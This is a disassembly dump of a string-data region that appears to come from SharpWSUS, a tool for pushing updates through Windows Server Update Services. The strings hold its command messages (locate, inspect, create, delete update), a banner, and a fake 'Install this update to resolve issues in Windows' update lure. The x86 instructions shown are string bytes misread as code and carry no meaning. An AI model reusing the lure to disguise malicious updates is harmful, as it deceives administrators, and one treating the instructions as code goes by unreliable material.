  40c23e:	67 00 65 00          	add    %ah,0x0(%di)
  40c242:	74 00                	je     0x40c244
  40c244:	2e 00 46 00          	add    %al,%cs:0x0(%esi)
  40c248:	51                   	push   %ecx
  40c249:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40c24d:	00 00                	add    %al,(%eax)
  40c24f:	6b 0d 00 0a 00 5b 00 	imul   $0x0,0x5b000a00,%ecx
  40c256:	2a 00                	sub    (%eax),%al
  40c258:	5d                   	pop    %ebp
  40c259:	00 20                	add    %ah,(%eax)
  40c25b:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40c25f:	00 20                	add    %ah,(%eax)
  40c261:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c265:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40c269:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c26d:	00 20                	add    %ah,(%eax)
  40c26f:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40c273:	00 65 00             	add    %ah,0x0(%ebp)
  40c276:	20 00                	and    %al,(%eax)
  40c278:	75 00                	jne    0x40c27a
  40c27a:	70 00                	jo     0x40c27c
  40c27c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40c280:	74 00                	je     0x40c282
  40c282:	65 00 20             	add    %ah,%gs:(%eax)
  40c285:	00 75 00             	add    %dh,0x0(%ebp)
  40c288:	73 00                	jae    0x40c28a
  40c28a:	65 00 20             	add    %ah,%gs:(%eax)
  40c28d:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40c291:	00 65 00             	add    %ah,0x0(%ebp)
  40c294:	20 00                	and    %al,(%eax)
  40c296:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c29a:	6c                   	insb   (%dx),%es:(%edi)
  40c29b:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40c29f:	00 77 00             	add    %dh,0x0(%edi)
  40c2a2:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c2a8:	20 00                	and    %al,(%eax)
  40c2aa:	63 00                	arpl   %eax,(%eax)
  40c2ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2ad:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2b0:	6d                   	insl   (%dx),%es:(%edi)
  40c2b1:	00 61 00             	add    %ah,0x0(%ecx)
  40c2b4:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2b5:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  40c2b9:	00 00                	add    %al,(%eax)
  40c2bb:	47                   	inc    %edi
  40c2bc:	5b                   	pop    %ebx
  40c2bd:	00 2a                	add    %ch,(%edx)
  40c2bf:	00 5d 00             	add    %bl,0x0(%ebp)
  40c2c2:	20 00                	and    %al,(%eax)
  40c2c4:	53                   	push   %ebx
  40c2c5:	00 68 00             	add    %ch,0x0(%eax)
  40c2c8:	61                   	popa
  40c2c9:	00 72 00             	add    %dh,0x0(%edx)
  40c2cc:	70 00                	jo     0x40c2ce
  40c2ce:	57                   	push   %edi
  40c2cf:	00 53 00             	add    %dl,0x0(%ebx)
  40c2d2:	55                   	push   %ebp
  40c2d3:	00 53 00             	add    %dl,0x0(%ebx)
  40c2d6:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40c2da:	78 00                	js     0x40c2dc
  40c2dc:	65 00 20             	add    %ah,%gs:(%eax)
  40c2df:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c2e3:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40c2e7:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c2eb:	00 20                	add    %ah,(%eax)
  40c2ed:	00 2f                	add    %ch,(%edi)
  40c2ef:	00 75 00             	add    %dh,0x0(%ebp)
  40c2f2:	70 00                	jo     0x40c2f4
  40c2f4:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40c2f8:	74 00                	je     0x40c2fa
  40c2fa:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c2fe:	64 00 3a             	add    %bh,%fs:(%edx)
  40c301:	00 00                	add    %al,(%eax)
  40c303:	2f                   	das
  40c304:	0d 00 0a 00 5b       	or     $0x5b000a00,%eax
  40c309:	00 2a                	add    %ch,(%edx)
  40c30b:	00 5d 00             	add    %bl,0x0(%ebp)
  40c30e:	20 00                	and    %al,(%eax)
  40c310:	43                   	inc    %ebx
  40c311:	00 72 00             	add    %dh,0x0(%edx)
  40c314:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c318:	74 00                	je     0x40c31a
  40c31a:	65 00 20             	add    %ah,%gs:(%eax)
  40c31d:	00 63 00             	add    %ah,0x0(%ebx)
  40c320:	6f                   	outsl  %ds:(%esi),(%dx)
  40c321:	00 6d 00             	add    %ch,0x0(%ebp)
  40c324:	70 00                	jo     0x40c326
  40c326:	6c                   	insb   (%dx),%es:(%edi)
  40c327:	00 65 00             	add    %ah,0x0(%ebp)
  40c32a:	74 00                	je     0x40c32c
  40c32c:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40c333:	21 53 00             	and    %edx,0x0(%ebx)
  40c336:	68 00 61 00 72       	push   $0x72006100
  40c33b:	00 70 00             	add    %dh,0x0(%eax)
  40c33e:	57                   	push   %edi
  40c33f:	00 53 00             	add    %dl,0x0(%ebx)
  40c342:	55                   	push   %ebp
  40c343:	00 53 00             	add    %dl,0x0(%ebx)
  40c346:	20 00                	and    %al,(%eax)
  40c348:	55                   	push   %ebp
  40c349:	00 70 00             	add    %dh,0x0(%eax)
  40c34c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40c350:	74 00                	je     0x40c352
  40c352:	65 00 00             	add    %al,%gs:(%eax)
  40c355:	15 32 00 30 00       	adc    $0x300032,%eax
  40c35a:	32 00                	xor    (%eax),%al
  40c35c:	31 00                	xor    %eax,(%eax)
  40c35e:	2d 00 30 00 39       	sub    $0x39003000,%eax
  40c363:	00 2d 00 32 00 36    	add    %ch,0x36003200
  40c369:	00 01                	add    %al,(%ecx)
  40c36b:	13 49 00             	adc    0x0(%ecx),%ecx
  40c36e:	6d                   	insl   (%dx),%es:(%edi)
  40c36f:	00 70 00             	add    %dh,0x0(%eax)
  40c372:	6f                   	outsl  %ds:(%esi),(%dx)
  40c373:	00 72 00             	add    %dh,0x0(%edx)
  40c376:	74 00                	je     0x40c378
  40c378:	61                   	popa
  40c379:	00 6e 00             	add    %ch,0x0(%esi)
  40c37c:	74 00                	je     0x40c37e
  40c37e:	00 0f                	add    %cl,(%edi)
  40c380:	35 00 30 00 30       	xor    $0x30003000,%eax
  40c385:	00 36                	add    %dh,(%esi)
  40c387:	00 31                	add    %dh,(%ecx)
  40c389:	00 30                	add    %dh,(%eax)
  40c38b:	00 33                	add    %dh,(%ebx)
  40c38d:	00 00                	add    %al,(%eax)
  40c38f:	63 49 00             	arpl   %ecx,0x0(%ecx)
  40c392:	6e                   	outsb  %ds:(%esi),(%dx)
  40c393:	00 73 00             	add    %dh,0x0(%ebx)
  40c396:	74 00                	je     0x40c398
  40c398:	61                   	popa
  40c399:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c39d:	00 20                	add    %ah,(%eax)
  40c39f:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40c3a3:	00 69 00             	add    %ch,0x0(%ecx)
  40c3a6:	73 00                	jae    0x40c3a8
  40c3a8:	20 00                	and    %al,(%eax)
  40c3aa:	75 00                	jne    0x40c3ac
  40c3ac:	70 00                	jo     0x40c3ae
  40c3ae:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40c3b2:	74 00                	je     0x40c3b4
  40c3b4:	65 00 20             	add    %ah,%gs:(%eax)
  40c3b7:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40c3bb:	00 20                	add    %ah,(%eax)
  40c3bd:	00 72 00             	add    %dh,0x0(%edx)
  40c3c0:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c3c4:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3c5:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40c3c9:	00 65 00             	add    %ah,0x0(%ebp)
  40c3cc:	20 00                	and    %al,(%eax)
  40c3ce:	69 00 73 00 73 00    	imul   $0x730073,(%eax),%eax
  40c3d4:	75 00                	jne    0x40c3d6
  40c3d6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c3da:	20 00                	and    %al,(%eax)
  40c3dc:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  40c3e2:	57                   	push   %edi
  40c3e3:	00 69 00             	add    %ch,0x0(%ecx)
  40c3e6:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3e7:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40c3eb:	00 77 00             	add    %dh,0x0(%edi)
  40c3ee:	73 00                	jae    0x40c3f0
  40c3f0:	2e 00 00             	add    %al,%cs:(%eax)
  40c3f3:	33 68 00             	xor    0x0(%eax),%ebp
  40c3f6:	74 00                	je     0x40c3f8
  40c3f8:	74 00                	je     0x40c3fa
  40c3fa:	70 00                	jo     0x40c3fc
  40c3fc:	73 00                	jae    0x40c3fe
  40c3fe:	3a 00                	cmp    (%eax),%al
  40c400:	2f                   	das
  40c401:	00 2f                	add    %ch,(%edi)
  40c403:	00 77 00             	add    %dh,0x0(%edi)
  40c406:	77 00                	ja     0x40c408
  40c408:	77 00                	ja     0x40c40a
  40c40a:	2e 00 6e 00          	add    %ch,%cs:0x0(%esi)
  40c40e:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  40c413:	00 69 00             	add    %ch,0x0(%ecx)
  40c416:	74 00                	je     0x40c418
  40c418:	75 00                	jne    0x40c41a
  40c41a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40c41e:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40c422:	6f                   	outsl  %ds:(%esi),(%dx)
  40c423:	00 6d 00             	add    %ch,0x0(%ebp)
  40c426:	00 0d 64 00 65 00    	add    %cl,0x650064
  40c42c:	6c                   	insb   (%dx),%es:(%edi)
  40c42d:	00 65 00             	add    %ah,0x0(%ebp)
  40c430:	74 00                	je     0x40c432
  40c432:	65 00 00             	add    %al,%gs:(%eax)
  40c435:	33 5b 00             	xor    0x0(%ebx),%ebx
  40c438:	2a 00                	sub    (%eax),%al
  40c43a:	5d                   	pop    %ebp
  40c43b:	00 20                	add    %ah,(%eax)
  40c43d:	00 41 00             	add    %al,0x0(%ecx)
  40c440:	63 00                	arpl   %eax,(%eax)
  40c442:	74 00                	je     0x40c444
  40c444:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c44a:	3a 00                	cmp    (%eax),%al
  40c44c:	20 00                	and    %al,(%eax)
  40c44e:	44                   	inc    %esp
  40c44f:	00 65 00             	add    %ah,0x0(%ebp)
  40c452:	6c                   	insb   (%dx),%es:(%edi)
  40c453:	00 65 00             	add    %ah,0x0(%ebp)
  40c456:	74 00                	je     0x40c458
  40c458:	65 00 20             	add    %ah,%gs:(%eax)
  40c45b:	00 55 00             	add    %dl,0x0(%ebp)
  40c45e:	70 00                	jo     0x40c460
  40c460:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40c464:	74 00                	je     0x40c466
  40c466:	65 00 00             	add    %al,%gs:(%eax)
  40c469:	15 2f 00 6b 00       	adc    $0x6b002f,%eax
  40c46e:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40c472:	70 00                	jo     0x40c474
  40c474:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40c478:	6f                   	outsl  %ds:(%esi),(%dx)
  40c479:	00 75 00             	add    %dh,0x0(%ebp)
  40c47c:	70 00                	jo     0x40c47e
  40c47e:	00 2f                	add    %ch,(%edi)
  40c480:	0d 00 0a 00 5b       	or     $0x5b000a00,%eax
  40c485:	00 2a                	add    %ch,(%edx)
  40c487:	00 5d 00             	add    %bl,0x0(%ebp)
  40c48a:	20 00                	and    %al,(%eax)
  40c48c:	44                   	inc    %esp
  40c48d:	00 65 00             	add    %ah,0x0(%ebp)
  40c490:	6c                   	insb   (%dx),%es:(%edi)
  40c491:	00 65 00             	add    %ah,0x0(%ebp)
  40c494:	74 00                	je     0x40c496
  40c496:	65 00 20             	add    %ah,%gs:(%eax)
  40c499:	00 63 00             	add    %ah,0x0(%ebx)
  40c49c:	6f                   	outsl  %ds:(%esi),(%dx)
  40c49d:	00 6d 00             	add    %ch,0x0(%ebp)
  40c4a0:	70 00                	jo     0x40c4a2
  40c4a2:	6c                   	insb   (%dx),%es:(%edi)
  40c4a3:	00 65 00             	add    %ah,0x0(%ebp)
  40c4a6:	74 00                	je     0x40c4a8
  40c4a8:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40c4af:	0d 6c 00 6f 00       	or     $0x6f006c,%eax
  40c4b4:	63 00                	arpl   %eax,(%eax)
  40c4b6:	61                   	popa
  40c4b7:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c4bb:	00 00                	add    %al,(%eax)
  40c4bd:	3d 5b 00 2a 00       	cmp    $0x2a005b,%eax
  40c4c2:	5d                   	pop    %ebp
  40c4c3:	00 20                	add    %ah,(%eax)
  40c4c5:	00 41 00             	add    %al,0x0(%ecx)
  40c4c8:	63 00                	arpl   %eax,(%eax)
  40c4ca:	74 00                	je     0x40c4cc
  40c4cc:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c4d2:	3a 00                	cmp    (%eax),%al
  40c4d4:	20 00                	and    %al,(%eax)
  40c4d6:	4c                   	dec    %esp
  40c4d7:	00 6f 00             	add    %ch,0x0(%edi)
  40c4da:	63 00                	arpl   %eax,(%eax)
  40c4dc:	61                   	popa
  40c4dd:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c4e1:	00 20                	add    %ah,(%eax)
  40c4e3:	00 57 00             	add    %dl,0x0(%edi)
  40c4e6:	53                   	push   %ebx
  40c4e7:	00 55 00             	add    %dl,0x0(%ebp)
  40c4ea:	53                   	push   %ebx
  40c4eb:	00 20                	add    %ah,(%eax)
  40c4ed:	00 53 00             	add    %dl,0x0(%ebx)
  40c4f0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c4f4:	76 00                	jbe    0x40c4f6
  40c4f6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c4fa:	00 2f                	add    %ch,(%edi)
  40c4fc:	0d 00 0a 00 5b       	or     $0x5b000a00,%eax
  40c501:	00 2a                	add    %ch,(%edx)
  40c503:	00 5d 00             	add    %bl,0x0(%ebp)
  40c506:	20 00                	and    %al,(%eax)
  40c508:	4c                   	dec    %esp
  40c509:	00 6f 00             	add    %ch,0x0(%edi)
  40c50c:	63 00                	arpl   %eax,(%eax)
  40c50e:	61                   	popa
  40c50f:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c513:	00 20                	add    %ah,(%eax)
  40c515:	00 63 00             	add    %ah,0x0(%ebx)
  40c518:	6f                   	outsl  %ds:(%esi),(%dx)
  40c519:	00 6d 00             	add    %ch,0x0(%ebp)
  40c51c:	70 00                	jo     0x40c51e
  40c51e:	6c                   	insb   (%dx),%es:(%edi)
  40c51f:	00 65 00             	add    %ah,0x0(%ebp)
  40c522:	74 00                	je     0x40c524
  40c524:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40c52b:	0f 69 00             	punpckhwd (%eax),%mm0
  40c52e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c52f:	00 73 00             	add    %dh,0x0(%ebx)
  40c532:	70 00                	jo     0x40c534
  40c534:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c538:	74 00                	je     0x40c53a
  40c53a:	00 3f                	add    %bh,(%edi)
  40c53c:	5b                   	pop    %ebx
  40c53d:	00 2a                	add    %ch,(%edx)
  40c53f:	00 5d 00             	add    %bl,0x0(%ebp)
  40c542:	20 00                	and    %al,(%eax)
  40c544:	41                   	inc    %ecx
  40c545:	00 63 00             	add    %ah,0x0(%ebx)
  40c548:	74 00                	je     0x40c54a
  40c54a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c550:	3a 00                	cmp    (%eax),%al
  40c552:	20 00                	and    %al,(%eax)
  40c554:	49                   	dec    %ecx
  40c555:	00 6e 00             	add    %ch,0x0(%esi)
  40c558:	73 00                	jae    0x40c55a
  40c55a:	70 00                	jo     0x40c55c
  40c55c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c560:	74 00                	je     0x40c562
  40c562:	20 00                	and    %al,(%eax)
  40c564:	57                   	push   %edi
  40c565:	00 53 00             	add    %dl,0x0(%ebx)
  40c568:	55                   	push   %ebp
  40c569:	00 53 00             	add    %dl,0x0(%ebx)
  40c56c:	20 00                	and    %al,(%eax)
  40c56e:	53                   	push   %ebx
  40c56f:	00 65 00             	add    %ah,0x0(%ebp)
  40c572:	72 00                	jb     0x40c574
  40c574:	76 00                	jbe    0x40c576
  40c576:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c57a:	00 31                	add    %dh,(%ecx)
  40c57c:	0d 00 0a 00 5b       	or     $0x5b000a00,%eax
  40c581:	00 2a                	add    %ch,(%edx)
  40c583:	00 5d 00             	add    %bl,0x0(%ebp)
  40c586:	20 00                	and    %al,(%eax)
  40c588:	49                   	dec    %ecx
  40c589:	00 6e 00             	add    %ch,0x0(%esi)
  40c58c:	73 00                	jae    0x40c58e
  40c58e:	70 00                	jo     0x40c590
  40c590:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c594:	74 00                	je     0x40c596
  40c596:	20 00                	and    %al,(%eax)
  40c598:	63 00                	arpl   %eax,(%eax)
  40c59a:	6f                   	outsl  %ds:(%esi),(%dx)
  40c59b:	00 6d 00             	add    %ch,0x0(%ebp)
  40c59e:	70 00                	jo     0x40c5a0
  40c5a0:	6c                   	insb   (%dx),%es:(%edi)
  40c5a1:	00 65 00             	add    %ah,0x0(%ebp)
  40c5a4:	74 00                	je     0x40c5a6
  40c5a6:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40c5ad:	82 db 0d             	sbb    $0xd,%bl
  40c5b0:	00 0a                	add    %cl,(%edx)
  40c5b2:	00 20                	add    %ah,(%eax)
  40c5b4:	00 5f 00             	add    %bl,0x0(%edi)
  40c5b7:	5f                   	pop    %edi
  40c5b8:	00 5f 00             	add    %bl,0x0(%edi)
  40c5bb:	5f                   	pop    %edi
  40c5bc:	00 20                	add    %ah,(%eax)
  40c5be:	00 20                	add    %ah,(%eax)
  40c5c0:	00 5f 00             	add    %bl,0x0(%edi)
  40c5c3:	20 00                	and    %al,(%eax)
  40c5c5:	20 00                	and    %al,(%eax)
  40c5c7:	20 00                	and    %al,(%eax)
  40c5c9:	20 00                	and    %al,(%eax)
  40c5cb:	20 00                	and    %al,(%eax)
  40c5cd:	20 00                	and    %al,(%eax)
  40c5cf:	20 00                	and    %al,(%eax)
  40c5d1:	20 00                	and    %al,(%eax)
  40c5d3:	20 00                	and    %al,(%eax)
  40c5d5:	20 00                	and    %al,(%eax)
  40c5d7:	20 00                	and    %al,(%eax)
  40c5d9:	20 00                	and    %al,(%eax)
  40c5db:	20 00                	and    %al,(%eax)
  40c5dd:	20 00                	and    %al,(%eax)
  40c5df:	20 00                	and    %al,(%eax)
  40c5e1:	20 00                	and    %al,(%eax)
  40c5e3:	20 00                	and    %al,(%eax)
  40c5e5:	20 00                	and    %al,(%eax)
  40c5e7:	20 00                	and    %al,(%eax)
  40c5e9:	5f                   	pop    %edi
  40c5ea:	00 5f 00             	add    %bl,0x0(%edi)
  40c5ed:	20 00                	and    %al,(%eax)
  40c5ef:	20 00                	and    %al,(%eax)
  40c5f1:	20 00                	and    %al,(%eax)
  40c5f3:	20 00                	and    %al,(%eax)
  40c5f5:	20 00                	and    %al,(%eax)
  40c5f7:	20 00                	and    %al,(%eax)
  40c5f9:	20 00                	and    %al,(%eax)
  40c5fb:	20 00                	and    %al,(%eax)
  40c5fd:	5f                   	pop    %edi
  40c5fe:	00 5f 00             	add    %bl,0x0(%edi)
  40c601:	5f                   	pop    %edi
  40c602:	00 5f 00             	add    %bl,0x0(%edi)
  40c605:	5f                   	pop    %edi
  40c606:	00 5f 00             	add    %bl,0x0(%edi)
  40c609:	20 00                	and    %al,(%eax)
  40c60b:	20 00                	and    %al,(%eax)
  40c60d:	5f                   	pop    %edi
  40c60e:	00 20                	add    %ah,(%eax)
  40c610:	00 20                	add    %ah,(%eax)
  40c612:	00 20                	add    %ah,(%eax)
  40c614:	00 5f 00             	add    %bl,0x0(%edi)
  40c617:	20 00                	and    %al,(%eax)
  40c619:	5f                   	pop    %edi
  40c61a:	00 5f 00             	add    %bl,0x0(%edi)
  40c61d:	5f                   	pop    %edi
  40c61e:	00 5f 00             	add    %bl,0x0(%edi)
  40c621:	0d 00 0a 00 2f       	or     $0x2f000a00,%eax
  40c626:	00 20                	add    %ah,(%eax)
  40c628:	00 5f 00             	add    %bl,0x0(%edi)
  40c62b:	5f                   	pop    %edi
  40c62c:	00 5f 00             	add    %bl,0x0(%edi)
  40c62f:	7c 00                	jl     0x40c631
  40c631:	7c 00                	jl     0x40c633
  40c633:	20 00                	and    %al,(%eax)
  40c635:	7c 00                	jl     0x40c637
  40c637:	5f                   	pop    %edi
  40c638:	00 5f 00             	add    %bl,0x0(%edi)
  40c63b:	20 00                	and    %al,(%eax)
  40c63d:	20 00                	and    %al,(%eax)
  40c63f:	20 00                	and    %al,(%eax)
  40c641:	5f                   	pop    %edi
  40c642:	00 5f 00             	add    %bl,0x0(%edi)
  40c645:	20 00                	and    %al,(%eax)
  40c647:	5f                   	pop    %edi
  40c648:	00 20                	add    %ah,(%eax)
  40c64a:	00 5f 00             	add    %bl,0x0(%edi)
  40c64d:	20 00                	and    %al,(%eax)
  40c64f:	5f                   	pop    %edi
  40c650:	00 5f 00             	add    %bl,0x0(%edi)
  40c653:	20 00                	and    %al,(%eax)
  40c655:	5f                   	pop    %edi
  40c656:	00 20                	add    %ah,(%eax)
  40c658:	00 5f 00             	add    %bl,0x0(%edi)
  40c65b:	5c                   	pop    %esp
  40c65c:	00 20                	add    %ah,(%eax)
  40c65e:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  40c662:	00 20                	add    %ah,(%eax)
  40c664:	00 20                	add    %ah,(%eax)
  40c666:	00 20                	add    %ah,(%eax)
  40c668:	00 20                	add    %ah,(%eax)
  40c66a:	00 20                	add    %ah,(%eax)
  40c66c:	00 2f                	add    %ch,(%edi)
  40c66e:	00 20                	add    %ah,(%eax)
  40c670:	00 2f                	add    %ch,(%edi)
  40c672:	00 20                	add    %ah,(%eax)
  40c674:	00 5f 00             	add    %bl,0x0(%edi)
  40c677:	5f                   	pop    %edi
  40c678:	00 5f 00             	add    %bl,0x0(%edi)
  40c67b:	7c 00                	jl     0x40c67d
  40c67d:	7c 00                	jl     0x40c67f
  40c67f:	20 00                	and    %al,(%eax)
  40c681:	7c 00                	jl     0x40c683
  40c683:	20 00                	and    %al,(%eax)
  40c685:	7c 00                	jl     0x40c687
  40c687:	20 00                	and    %al,(%eax)
  40c689:	2f                   	das
  40c68a:	00 20                	add    %ah,(%eax)
  40c68c:	00 5f 00             	add    %bl,0x0(%edi)
  40c68f:	5f                   	pop    %edi
  40c690:	00 5f 00             	add    %bl,0x0(%edi)
  40c693:	7c 00                	jl     0x40c695
  40c695:	0d 00 0a 00 5c       	or     $0x5c000a00,%eax
  40c69a:	00 5f 00             	add    %bl,0x0(%edi)
  40c69d:	5f                   	pop    %edi
  40c69e:	00 5f 00             	add    %bl,0x0(%edi)
  40c6a1:	20 00                	and    %al,(%eax)
  40c6a3:	5c                   	pop    %esp
  40c6a4:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c6a8:	00 27                	add    %ah,(%edi)
  40c6aa:	00 5f 00             	add    %bl,0x0(%edi)
  40c6ad:	20 00                	and    %al,(%eax)
  40c6af:	5c                   	pop    %esp
  40c6b0:	00 20                	add    %ah,(%eax)
  40c6b2:	00 2f                	add    %ch,(%edi)
  40c6b4:	00 20                	add    %ah,(%eax)
  40c6b6:	00 5f 00             	add    %bl,0x0(%edi)
  40c6b9:	60                   	pusha
  40c6ba:	00 20                	add    %ah,(%eax)
  40c6bc:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c6c0:	00 27                	add    %ah,(%edi)
  40c6c2:	00 5f 00             	add    %bl,0x0(%edi)
  40c6c5:	5f                   	pop    %edi
  40c6c6:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c6ca:	00 27                	add    %ah,(%edi)
  40c6cc:	00 5f 00             	add    %bl,0x0(%edi)
  40c6cf:	20 00                	and    %al,(%eax)
  40c6d1:	5c                   	pop    %esp
  40c6d2:	00 20                	add    %ah,(%eax)
  40c6d4:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  40c6d8:	00 2f                	add    %ch,(%edi)
  40c6da:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  40c6de:	00 2f                	add    %ch,(%edi)
  40c6e0:	00 20                	add    %ah,(%eax)
  40c6e2:	00 2f                	add    %ch,(%edi)
  40c6e4:	00 5c 00 5f          	add    %bl,0x5f(%eax,%eax,1)
  40c6e8:	00 5f 00             	add    %bl,0x0(%edi)
  40c6eb:	5f                   	pop    %edi
  40c6ec:	00 20                	add    %ah,(%eax)
  40c6ee:	00 5c 00 7c          	add    %bl,0x7c(%eax,%eax,1)
  40c6f2:	00 20                	add    %ah,(%eax)
  40c6f4:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c6f8:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c6fc:	00 5c 00 5f          	add    %bl,0x5f(%eax,%eax,1)
  40c700:	00 5f 00             	add    %bl,0x0(%edi)
  40c703:	5f                   	pop    %edi
  40c704:	00 20                	add    %ah,(%eax)
  40c706:	00 5c 00 0d          	add    %bl,0xd(%eax,%eax,1)
  40c70a:	00 0a                	add    %cl,(%edx)
  40c70c:	00 20                	add    %ah,(%eax)
  40c70e:	00 5f 00             	add    %bl,0x0(%edi)
  40c711:	5f                   	pop    %edi
  40c712:	00 5f 00             	add    %bl,0x0(%edi)
  40c715:	29 00                	sub    %eax,(%eax)
  40c717:	20 00                	and    %al,(%eax)
  40c719:	7c 00                	jl     0x40c71b
  40c71b:	20 00                	and    %al,(%eax)
  40c71d:	7c 00                	jl     0x40c71f
  40c71f:	20 00                	and    %al,(%eax)
  40c721:	7c 00                	jl     0x40c723
  40c723:	20 00                	and    %al,(%eax)
  40c725:	7c 00                	jl     0x40c727
  40c727:	20 00                	and    %al,(%eax)
  40c729:	28 00                	sub    %al,(%eax)
  40c72b:	5f                   	pop    %edi
  40c72c:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c730:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c734:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c738:	00 20                	add    %ah,(%eax)
  40c73a:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c73e:	00 7c 00 5f          	add    %bh,0x5f(%eax,%eax,1)
  40c742:	00 29                	add    %ch,(%ecx)
  40c744:	00 20                	add    %ah,(%eax)
  40c746:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  40c74a:	00 56 00             	add    %dl,0x0(%esi)
  40c74d:	20 00                	and    %al,(%eax)
  40c74f:	20 00                	and    %al,(%eax)
  40c751:	56                   	push   %esi
  40c752:	00 20                	add    %ah,(%eax)
  40c754:	00 2f                	add    %ch,(%edi)
  40c756:	00 20                	add    %ah,(%eax)
  40c758:	00 20                	add    %ah,(%eax)
  40c75a:	00 5f 00             	add    %bl,0x0(%edi)
  40c75d:	5f                   	pop    %edi
  40c75e:	00 5f 00             	add    %bl,0x0(%edi)
  40c761:	29 00                	sub    %eax,(%eax)
  40c763:	20 00                	and    %al,(%eax)
  40c765:	7c 00                	jl     0x40c767
  40c767:	20 00                	and    %al,(%eax)
  40c769:	7c 00                	jl     0x40c76b
  40c76b:	5f                   	pop    %edi
  40c76c:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c770:	00 7c 00 5f          	add    %bh,0x5f(%eax,%eax,1)
  40c774:	00 5f 00             	add    %bl,0x0(%edi)
  40c777:	5f                   	pop    %edi
  40c778:	00 29                	add    %ch,(%ecx)
  40c77a:	00 20                	add    %ah,(%eax)
  40c77c:	00 7c 00 0d          	add    %bh,0xd(%eax,%eax,1)
  40c780:	00 0a                	add    %cl,(%edx)
  40c782:	00 7c 00 5f          	add    %bh,0x5f(%eax,%eax,1)
  40c786:	00 5f 00             	add    %bl,0x0(%edi)
  40c789:	5f                   	pop    %edi
  40c78a:	00 5f 00             	add    %bl,0x0(%edi)
  40c78d:	2f                   	das
  40c78e:	00 7c 00 5f          	add    %bh,0x5f(%eax,%eax,1)
  40c792:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  40c796:	00 7c 00 5f          	add    %bh,0x5f(%eax,%eax,1)
  40c79a:	00 7c 00 5c          	add    %bh,0x5c(%eax,%eax,1)
  40c79e:	00 5f 00             	add    %bl,0x0(%edi)
  40c7a1:	5f                   	pop    %edi
  40c7a2:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c7a5:	5f                   	pop    %edi
  40c7a6:	00 7c 00 5f          	add    %bh,0x5f(%eax,%eax,1)
  40c7aa:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
